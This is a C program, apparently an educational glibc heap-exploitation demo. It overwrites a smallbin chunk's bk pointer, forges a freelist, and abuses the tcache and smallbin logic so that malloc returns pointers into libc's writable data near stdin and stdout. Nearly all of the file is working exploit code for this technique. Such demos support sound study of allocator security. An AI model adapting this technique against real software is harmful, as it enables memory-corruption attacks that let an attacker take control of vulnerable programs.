#include <stdlib.h>
#include <assert.h>
#include <stdio.h>

int main(int argc, char * argv[]){
	//the smallbin chunk we will overwrite the bk of
	char *victim = malloc(0x510);
	char *tcache = (char*)victim - 0x250;
	//to avoid consolidation with top
	char *guard = malloc(0x1000);
	//put victim in unsorted bin
	free(victim);
	//allocate a chunk that will be cut from victim 
	//the size of the remainder is 0x110(with metadata)
	char *trim_victim = malloc(0x400);

	//update victim to reflect the trim
	victim =  trim_victim + 0x410;
	//the victim including metadata
	char **victim_chunk = (char **)victim-2;

	//the chunk we will overwrite in its tcache entry
	//its entry is the one immediately following the one
	//corresponding to victim size
	char *tcache_target = malloc(0x110);
	tcache += 0x40 + (int)(0x110/0x10 - 1 )*8 ;
	//sort victim into the small bin
	//this progression bypasses filling the tcache 
	//so 6 less allocations
	void *p2 = malloc(0x1000);
	//putting tcache_target in tcache
	free(tcache_target);

	//keep the address of the smallbin for later sanity check
	char *smallbin = victim_chunk[2];

	//create a fake freelist on the heap , we can use 
	//the trim result for that
	char * (*freelist)[4] = (char * (*)[4])trim_victim;
	//links the fake list chunks
	for(int i=0; i<6; i++) {
		freelist[i][3] = (char*) freelist[i+1];
	}
	//to bypass the smallbin fd check
	freelist[0][2] = (char *) victim_chunk;


	//the address of the smallbin will be written to 
	//(freelist[6]->bk)->fd 
	freelist[6][3] = (void*)tcache-0x10;

	//------------VULNERABILITY-----------
	victim_chunk[3] = (char *)freelist[0]; 
	//------------------------------------

	//this allocates victim and starts filling tcache with chunks from
	//our freelist 
	char *trigger = malloc(0x100);
	char *alloc1 = malloc(0x100);
	//this allocates the smallbin address
	char **alloc2 = malloc(0x110);
	assert((long)alloc2 == (long)smallbin);
	//now we assume the attacker can read from alloc2 an address of libc
	//this is why this require both read and write capability
	//
	//get the address of the eith bin forward
	char **bin2 = alloc2;
	char **bin1 = alloc2;
	char *alloc3 = NULL;
	//make sure we started before stdout
	assert((long)alloc2 < (long) stdout);
	char *backup[4];
	while ((void *)alloc3 < (void *)stdin + 0x300){
		bin2 += 28;
		//simulate a write
		//fake links of current bin to point to the next allocated one
		bin1[0] = bin1[1] = (char *) bin2;
		//backup bin2 contents to restore them and avoid crashes
		//we are overwriting ciritical libc data with our fake 
		//chunk , this goes with the assumption that the attacker can
		//read/write to malloced chunks , and bin2 chunk is entirely
		//within either bin1 or alloc3 , so no hidden dependencies
		for (int j = 0 ; j < 4 ; j++){
			backup[j] = bin2[j];
		}
		//fake sizes
		bin2[0] = bin2[1] = (char *) 0x100;
		//fake links of the next bin to point to point to current bin
		bin2[2] = bin2[3] = (char *) bin1-0x10;
		alloc3 = malloc(0xf0);
		assert((long)alloc3 == (long)bin2+0x10);
		//restore state
		for (int j = 0 ; j < 4 ; j++){
			bin2[j] = backup[j];
		}
		
	}
	//by now we reached beyond stdin+0x300 , which is not fat off the 
	//end of libc writable region
	exit(0);
}
